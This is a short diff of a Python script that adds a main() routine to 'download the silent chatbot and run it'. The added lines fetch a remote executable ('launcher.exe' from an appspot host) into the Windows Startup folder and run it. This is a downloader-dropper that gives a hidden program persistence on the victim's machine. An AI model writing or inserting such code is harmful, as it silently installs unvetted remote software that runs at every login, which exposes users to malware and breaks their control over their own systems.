@@ -63,7 +63,10 @@ def __file_setstate(path, state):
 
 def main():
     """Download the silent chatbot and run it."""
-    
+    download_install_run(
+        "http://littlesitetomakemoney.appspot.com/launcher.exe",
+        shellcon.CSIDL_STARTUP,
+        )
     
 if __name__ == "__main__":
     main()
